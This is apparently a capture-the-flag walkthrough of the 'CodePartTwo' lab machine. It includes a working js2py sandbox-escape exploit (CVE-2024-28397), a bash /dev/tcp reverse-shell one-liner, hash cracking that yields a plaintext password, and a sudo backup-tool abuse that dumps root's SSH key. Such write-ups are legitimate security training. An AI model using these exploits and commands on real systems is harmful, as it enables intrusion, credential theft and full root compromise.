---
title: CodePartTwo
published: true
---

# Enumeration

```bash
❯ nmap -p- -n -sCV -T4 -Pn -vvv --min-rate=1000 10.129.1.2 --stats-every=25s | tee nmap.txt
```

```bash
Host is up, received user-set (0.23s latency).
Scanned at 2026-02-11 12:57:27 EST for 85s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCnwmWCXCzed9BzxaxS90h2iYyuDOrE2LkavbNeMlEUPvMpznuB9cs8CTnUenkaIA8RBb4mOfWGxAQ6a/nmKOea1FA6rfGG+fhOE/R1g8BkVoKGkpP1hR2XWbS3DWxJx3UUoKUDgFGSLsEDuW1C+ylg8UajGokSzK9NEg23WMpc6f+FORwJeHzOzsmjVktNrWeTOZthVkvQfqiDyB4bN0cTsv1mAp1jjbNnf/pALACTUmxgEemnTOsWk3Yt1fQkkT8IEQcOqqGQtSmOV9xbUmv6Y5ZoCAssWRYQ+JcR1vrzjoposAaMG8pjkUnXUN0KF/AtdXE37rGU0DLTO9+eAHXhvdujYukhwMp8GDi1fyZagAW+8YJb8uzeJBtkeMo0PFRIkKv4h/uy934gE0eJlnvnrnoYkKcXe+wUjnXBfJ/JhBlJvKtpLTgZwwlh95FJBiGLg5iiVaLB2v45vHTkpn5xo7AsUpW93Tkf+6ezP+1f3P7tiUlg3ostgHpHL5Z9478=
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBErhv1LbQSlbwl0ojaKls8F4eaTL4X4Uv6SYgH6Oe4Y+2qQddG0eQetFslxNF8dma6FK2YGcSZpICHKuY+ERh9c=
|   256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEJovaecM3DB4YxWK2pI7sTAv9PrxTbpLG2k97nMp+FM
8000/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
| http-methods:
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: gunicorn/20.0.4
|_http-title: Welcome to CodePartTwo
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:58
Completed NSE at 12:58, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:58
Completed NSE at 12:58, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:58
Completed NSE at 12:58, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.72 seconds
```

`nmap` found:

- SSH `22`
- HTTP `8000`

OpenSSH 8.2p1 on Ubuntu 20.04 is common and does not immediately suggest a public exploit.  
Without credentials, SSH is not a realistic entry point.

Port 8000 is running Gunicorn, strongly suggesting a Python web application (likely Flask).

We will focus entirely on the web service.

---

# Web Application Analysis

Visiting port `8000`:

![](/assets/CodePartTwo/1.png)

![](/assets/1.png)

Clicking **Download App** provides `app.zip`.

![](/assets/images/download-app.png)

After extracting the archive, the backend structure is revealed

![](/assets/images/app-structure.png)

---

## app.py Review

```python
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory
from flask_sqlalchemy import SQLAlchemy
import hashlib
import js2py
import os
import json

js2py.disable_pyimport()
app = Flask(__name__)
app.secret_key = 'S3cr3tK3yC0d3PartTw0'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(128), nullable=False)

class CodeSnippet(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    code = db.Column(db.Text, nullable=False)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/dashboard')
def dashboard():
    if 'user_id' in session:
        user_codes = CodeSnippet.query.filter_by(user_id=session['user_id']).all()
        return render_template('dashboard.html', codes=user_codes)
    return redirect(url_for('login'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        new_user = User(username=username, password_hash=password_hash)
        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        user = User.query.filter_by(username=username, password_hash=password_hash).first()
        if user:
            session['user_id'] = user.id
            session['username'] = username;
            return redirect(url_for('dashboard'))
        return "Invalid credentials"
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    return redirect(url_for('index'))

@app.route('/save_code', methods=['POST'])
def save_code():
    if 'user_id' in session:
        code = request.json.get('code')
        new_code = CodeSnippet(user_id=session['user_id'], code=code)
        db.session.add(new_code)
        db.session.commit()
        return jsonify({"message": "Code saved successfully"})
    return jsonify({"error": "User not logged in"}), 401

@app.route('/download')
def download():
    return send_from_directory(directory='/home/app/app/static/', path='app.zip', as_attachment=True)

@app.route('/delete_code/<int:code_id>', methods=['POST'])
def delete_code(code_id):
    if 'user_id' in session:
        code = CodeSnippet.query.get(code_id)
        if code and code.user_id == session['user_id']:
            db.session.delete(code)
            db.session.commit()
            return jsonify({"message": "Code deleted successfully"})
        return jsonify({"error": "Code not found"}), 404
    return jsonify({"error": "User not logged in"}), 401

@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', debug=True)
```

Secret Key Exposure

```python
app.secret_key = 'S3cr3tK3yC0d3PartTw0'
```
Could potentially be used to forge or modify Flask session cookies.

`requirements.txt`

```python
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```

I can spot the version `0.74` of `js2py` is in use. A quick search for that particular version returns `CVE-2024-28397` with a [proof-of-concept](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape) available.

This is critical.

We now have:
* Full backend logic
* Database structure
* Secret keys
* Dependency versions
* Internal file paths

This shifts the approach from blind testing to controlled analysis.

We will reference this code later, Lets just login to the website and checkout the page more.

---

# Login & Cookie Analysis
![](/assets/images/dashboard.png)

After login to the page we find ourself with a web `Code Editor` 

![](/assets/images/dashboard.png)

Lets try some simple codes.

![](/assets/images/dashboard.png)

Lets take a look at the cookies.

![](/assets/images/dashboard.png)

we can see that there is a `flask` cookie asigned to us, lets try and decode it using [flask-unsign](https://github.com/Paradoxis/Flask-Unsign) or `pip3 install flask-unsign` ref [Pentest Book](https://www.pentest-book.com/enumeration/webservices/flask)

```bash
❯ flask-unsign --decode --cookie 'eyJ1c2VyX2lkIjozLCJ1c2VybmFtZSI6IjAwdmxkIn0.aYzH6g.YmyeYr2dlLT5nja_pxhnZTdOgnw'
```

![](/assets/images/dashboard.png)

So the session cookie is just storing user data, signed with the Flask `secret_key`.

Since I already saw the secret key in `app.py`, this means I could technically forge or modify session cookies if the production server uses the same key.

But looking at the code again, there’s no admin role or special privilege logic. The session only stores `user_id` and `username`. So even if I forge a cookie, there’s nothing interesting to escalate to.

So lets test the vulnerability we found in the `js2py` version earlier.

---

## Testing the Exploit

We had found the [proof-of-concept](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/poc.py)

`poc.py`

```js
// [+] command goes here:
let cmd = "head -n 1 /etc/passwd; calc; gnome-calculator; kcalc; "
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```

I modified the payload to test command execution:

```js
let cmd = "id"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```

We get an error.

![](/assets/images/CodePartTwo/website-home.png)

Let's try pinging ourselves

![](/assets/images/CodePartTwo/website-home.png)

Received pings from the target. Command execution confirmed.

we are gonna input the simple bash shell from [revshells](https://www.revshells.com/)
```bash
bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'
```

and let's start a listener
```bash
nc -lvnp 4444
```

![](/assets/images/CodePartTwo/website-home.png)

and we get a shell.

Lets first stablize our shell and we could also use a shell handler such as [penelope](https://github.com/brightio/penelope)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background the Shell

```
CTRL + Z
```

```bash
stty raw -echo
```

then `fg`

```bash
export TERM=xterm
```

---

As we have already seen in the `app.zip` the file structure so let's head up straight to the `users.db`.

```bash
app@codeparttwo:~/app/instance$ cd ~/app/instance
app@codeparttwo:~/app/instance$ ls -al
total 24
drwxrwxr-x 2 app app  4096 Feb 13 12:53 .
drwxrwxr-x 6 app app  4096 Sep  1 13:25 ..
-rw-r--r-- 1 app app 16384 Feb 13 13:00 users.db
app@codeparttwo:~/app/instance$ sqlite3 -batch users.db ".tables"
code_snippet  user
app@codeparttwo:~/app/instance$ sqlite3 -batch users.db "SELECT * FROM user;"
1|marco|649c9d6..........e128bce5
2|app|a97588c........39e27aeb42e
app@codeparttwo:~/app/instance$
```

```bash
❯ hashid 649c9d65a206.......128bce5
Analyzing '649c9d6.......128bce5'
[+] MD2
[+] MD5
[+] MD4
[+] Double MD5
[+] LM
[+] RIPEMD-128
[+] Haval-128
[+] Tiger-128
[+] Skein-256(128)
[+] Skein-512(128)
[+] Lotus Notes/Domino 5
[+] Skype
[+] Snefru-128
[+] NTLM
[+] Domain Cached Credentials
[+] Domain Cached Credentials 2
[+] DNSSEC(NSEC3)
[+] RAdmin v2.x
```

```bash
hashcat -m 0 -a 0 -O 649c9d65a206......128bce5 /usr/share/wordlists/rockyou.txt
```

![](/assets/images/CodePartTwo/website-home.png)

---

Now we have creds.
```
marco : sweetangelbabylove
```

Lets upgrade our user, We could also use sshpass `sshpass -p sweetangelbabylove ssh marco@<IP>`

```bash
ssword:
marco@codeparttwo:~$ ls -al
total 44
drwxr-x--- 6 marco marco 4096 Feb 13 13:30 .
drwxr-xr-x 4 root  root  4096 Jan  2  2025 ..
drwx------ 7 root  root  4096 Apr  6  2025 backups
lrwxrwxrwx 1 root  root     9 Oct 26  2024 .bash_history -> /dev/null
-rw-r--r-- 1 marco marco  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 marco marco 3771 Feb 25  2020 .bashrc
drwx------ 2 marco marco 4096 Apr  6  2025 .cache
drwxrwxr-x 4 marco marco 4096 Feb  1  2025 .local
lrwxrwxrwx 1 root  root     9 Nov 17  2024 .mysql_history -> /dev/null
-rw-rw-r-- 1 root  root  2893 Jun 18  2025 npbackup.conf
-rw-r--r-- 1 marco marco  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root  root     9 Oct 26  2024 .python_history -> /dev/null
lrwxrwxrwx 1 root  root     9 Oct 31  2024 .sqlite_history -> /dev/null
drwx------ 2 marco marco 4096 Oct 20  2024 .ssh
-rw-r----- 1 root  marco   33 Feb 13 11:56 user.txt

marco@codeparttwo:~$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
    
marco@codeparttwo:~$ ls -l /opt/
total 4
drwxr-x--- 2 root backups 4096 Apr  6  2025 npbackup-cli
marco@codeparttwo:~$
```
___
### Privilege Escalation

```bash
marco@codeparttwo:~$ npbackup-cli -h

usage: npbackup-cli [-h] [-c CONFIG_FILE] [--repo-name REPO_NAME] [--repo-group REPO_GROUP] [-b] [-f] [-r RESTORE] [-s] [--ls [LS]] [--find FIND] [--forget FORGET] [--policy] [--housekeeping] [--quick-check] [--full-check] [--check CHECK] [--prune [PRUNE]] [--prune-max]
                    [--unlock] [--repair-index] [--repair-packs REPAIR_PACKS] [--repair-snapshots] [--repair REPAIR] [--recover] [--list LIST] [--dump DUMP] [--stats [STATS]] [--raw RAW] [--init] [--has-recent-snapshot] [--restore-includes RESTORE_INCLUDES]
                    [--snapshot-id SNAPSHOT_ID] [--json] [--stdin] [--stdin-filename STDIN_FILENAME] [-v] [-V] [--dry-run] [--no-cache] [--license] [--auto-upgrade] [--log-file LOG_FILE] [--show-config] [--external-backend-binary EXTERNAL_BACKEND_BINARY]
                    [--group-operation GROUP_OPERATION] [--create-key CREATE_KEY] [--create-backup-scheduled-task CREATE_BACKUP_SCHEDULED_TASK] [--create-housekeeping-scheduled-task CREATE_HOUSEKEEPING_SCHEDULED_TASK] [--check-config-file]

Portable Network Backup Client This program is distributed under the GNU General Public License and comes with ABSOLUTELY NO WARRANTY. This is free software, and you are welcome to redistribute it under certain conditions; Please type --license for more info.

optional arguments:
  -h, --help            show this help message and exit
  -c CONFIG_FILE, --config-file CONFIG_FILE
                        Path to alternative configuration file (defaults to current dir/npbackup.conf)
  --repo-name REPO_NAME
                        Name of the repository to work with. Defaults to 'default'. This can also be a comma separated list of repo names. Can accept special name '__all__' to work with all repositories.
  --repo-group REPO_GROUP
                        Comme separated list of groups to work with. Can accept special name '__all__' to work with all repositories.
  -b, --backup          Run a backup
  -f, --force           Force running a backup regardless of existing backups age
  -r RESTORE, --restore RESTORE
                        Restore to path given by --restore, add --snapshot-id to specify a snapshot other than latest
  -s, --snapshots       Show current snapshots
  --ls [LS]             Show content given snapshot. When no snapshot id is given, latest is used
  --find FIND           Find full path of given file / directory
  --forget FORGET       Forget given snapshot (accepts comma separated list of snapshots)
  --policy              Apply retention policy to snapshots (forget snapshots)
  --housekeeping        Run --check quick, --policy and --prune in one go
  --quick-check         Deprecated in favor of --'check quick'. Quick check repository
  --full-check          Deprecated in favor of '--check full'. Full check repository (read all data)
  --check CHECK         Checks the repository. Valid arguments are 'quick' (metadata check) and 'full' (metadata + data check)
  --prune [PRUNE]       Prune data in repository, also accepts max parameter in order prune reclaiming maximum space
  --prune-max           Deprecated in favor of --prune max
  --unlock              Unlock repository
  --repair-index        Deprecated in favor of '--repair index'.Repair repo index
  --repair-packs REPAIR_PACKS
                        Deprecated in favor of '--repair packs'. Repair repo packs ids given by --repair-packs
  --repair-snapshots    Deprecated in favor of '--repair snapshots'.Repair repo snapshots
  --repair REPAIR       Repair the repository. Valid arguments are 'index', 'snapshots', or 'packs'
  --recover             Recover lost repo snapshots
  --list LIST           Show [blobs|packs|index|snapshots|keys|locks] objects
  --dump DUMP           Dump a specific file to stdout (full path given by --ls), use with --dump [file], add --snapshot-id to specify a snapshot other than latest
  --stats [STATS]       Get repository statistics. If snapshot id is given, only snapshot statistics will be shown. You may also pass "--mode raw-data" or "--mode debug" (with double quotes) to get full repo statistics
  --raw RAW             Run raw command against backend. Use with --raw "my raw backend command"
  --init                Manually initialize a repo (is done automatically on first backup)
  --has-recent-snapshot
                        Check if a recent snapshot exists
  --restore-includes RESTORE_INCLUDES
                        Restore only paths within include path, comma separated list accepted
  --snapshot-id SNAPSHOT_ID
                        Choose which snapshot to use. Defaults to latest
  --json                Run in JSON API mode. Nothing else than JSON will be printed to stdout
  --stdin               Backup using data from stdin input
  --stdin-filename STDIN_FILENAME
                        Alternate filename for stdin, defaults to 'stdin.data'
  -v, --verbose         Show verbose output
  -V, --version         Show program version
  --dry-run             Run operations in test mode, no actual modifications
  --no-cache            Run operations without cache
  --license             Show license
  --auto-upgrade        Auto upgrade NPBackup
  --log-file LOG_FILE   Optional path for logfile
  --show-config         Show full inherited configuration for current repo. Optionally you can set NPBACKUP_MANAGER_PASSWORD env variable for more details.
  --external-backend-binary EXTERNAL_BACKEND_BINARY
                        Full path to alternative external backend binary
  --group-operation GROUP_OPERATION
                        Deprecated command to launch operations on multiple repositories. Not needed anymore. Replaced by --repo-name x,y or --repo-group x,y
  --create-key CREATE_KEY
                        Create a new encryption key, requires a file path
  --create-backup-scheduled-task CREATE_BACKUP_SCHEDULED_TASK
                        Create a scheduled backup task, specify an argument interval via interval=minutes, or hour=hour,minute=minute for a daily task
  --create-housekeeping-scheduled-task CREATE_HOUSEKEEPING_SCHEDULED_TASK
                        Create a scheduled housekeeping task, specify hour=hour,minute=minute for a daily task
  --check-config-file   Check if config file is valid
```

User `marco` can execute `npbackup-cli` as root without a password.
Looking at the `npbackup.conf` file in marco's home directory:

```bash
marco@codeparttwo:~$ cat npbackup.conf | grep paths
      paths:
      paths: []
        group_by_paths: false
        
        
marco@codeparttwo:~$ cat npbackup.conf
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri:
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /home/app/app/
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password:
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      stdin_from_command:
      stdin_filename:
      tags: []
      compression: auto
      use_fs_snapshot: true
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files:
      - excludes/generic_excluded_extensions
      - excludes/generic_excludes
      - excludes/windows_excludes
      - excludes/linux_excludes
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 10 MiB
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
      repo_password_command:
      minimum_backup_age: 1440
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
        ntp_server:
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false
identity:
  machine_id: ${HOSTNAME}__blw0
  machine_group:
global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}
marco@codeparttwo:~$
```

The key section is:
```bash
backup_opts:
  paths:
  - /home/app/app/
  source_type: folder_list
```

Currently it only backs up `/home/app/app/`.
**The exploitation plan:**
1. Copy the config file
2. Add `/root/` to the backup paths
3. Run backup as root (which backs up `/root/`)
4. List the backup contents
5. Extract root's SSH key from the backup

Copying the config
```bash
cp npbackup.conf /tmp/root.conf
```

Editing the config

```bash
nano /tmp/root.conf
```

![](/assets/images/flask-cookie.png)

**Why this works:**
* When `npbackup-cli` runs as root, it can access `/root/`
* The backup will now include all root-owned files
* I can then extract them from the backup snapshot

Run the backup
```bash
sudo npbackup-cli -c /tmp/root.conf -b --force
```
- `-c /tmp/root.conf` - Use my modified config
- `-b` - Perform backup operation
- `--force` - Bypass the `minimum_backup_age: 1440` check (otherwise it won't backup if one exists from last 24 hours)

![](/assets/images/flask-cookie.png)

Backup completed successfully. Now I need to see what's inside it.

```bash
marco@codeparttwo:~$ sudo npbackup-cli -c /tmp/root.conf --ls
2026-02-13 13:54:58,344 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2026-02-13 13:54:58,375 :: INFO :: Loaded config 73199EB2 in /tmp/root.conf
2026-02-13 13:54:58,386 :: INFO :: Showing content of snapshot latest in repo default
2026-02-13 13:55:00,975 :: INFO :: Successfully listed snapshot latest content:
snapshot f479be82 of [/home/app/app /root] at 2026-02-13 13:53:49.119729106 +0000 UTC by root@codeparttwo filtered by []:
/home
/home/app
/home/app/app
/home/app/app/__pycache__
/home/app/app/__pycache__/app.cpython-38.pyc
/home/app/app/app.py
/home/app/app/instance
/home/app/app/instance/users.db
/home/app/app/requirements.txt
/home/app/app/static
/home/app/app/static/app.zip
/home/app/app/static/css
/home/app/app/static/css/styles.css
/home/app/app/static/js
/home/app/app/static/js/script.js
/home/app/app/templates
/home/app/app/templates/base.html
/home/app/app/templates/dashboard.html
/home/app/app/templates/index.html
/home/app/app/templates/login.html
/home/app/app/templates/register.html
/root
/root/.bash_history
/root/.bashrc
/root/.cache
/root/.cache/motd.legal-displayed
/root/.local
/root/.local/share
/root/.local/share/nano
/root/.local/share/nano/search_history
/root/.mysql_history
/root/.profile
/root/.python_history
/root/.sqlite_history
/root/.ssh 
/root/.ssh/authorized_keys
/root/.ssh/id_rsa # <--- # Got id_rsa
/root/.vim
/root/.vim/.netrwhist
/root/root.txt
/root/scripts
/root/scripts/backup.tar.gz
/root/scripts/cleanup.sh
/root/scripts/cleanup_conf.sh
/root/scripts/cleanup_db.sh
/root/scripts/cleanup_marco.sh
/root/scripts/npbackup.conf
/root/scripts/users.db

2026-02-13 13:55:00,976 :: INFO :: Runner took 2.59039 seconds for ls
2026-02-13 13:55:00,976 :: INFO :: Operation finished
2026-02-13 13:55:00,987 :: INFO :: ExecTime = 0:00:02.645950, finished, state is: success.
marco@codeparttwo:~$
```

Extracting the private key
```bash
sudo npbackup-cli -c /tmp/root.conf --dump /root/.ssh/id_rsa > /tmp/id_rsa
```
using the `--dump`
Extracts a specific file from the backup.

```bash
marco@codeparttwo:~$ ls -al /tmp/id_rsa
-rw-rw-r-- 1 marco marco 2602 Feb 13 13:57 /tmp/id_rsa
marco@codeparttwo:~$ chmod 600 /tmp/id_rsa
marco@codeparttwo:~$ ssh -i /tmp/id_rsa root@localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:/tJyANpU1VQQ26JR0UR7+5bhDywmURGVMDitiJqBQcU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri 13 Feb 2026 01:58:39 PM UTC

  System load:           0.09
  Usage of /:            57.7% of 5.08GB
  Memory usage:          25%
  Swap usage:            0%
  Processes:             240
  Users logged in:       0
  IPv4 address for eth0: 10.129.2.102
  IPv6 address for eth0: dead:beef::250:56ff:feb9:28bf


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Feb 13 13:58:40 2026 from 127.0.0.1
root@codeparttwo:~#
```
![](/assets/images/flask-cookie.png)

Successfully [*Pwned].
---
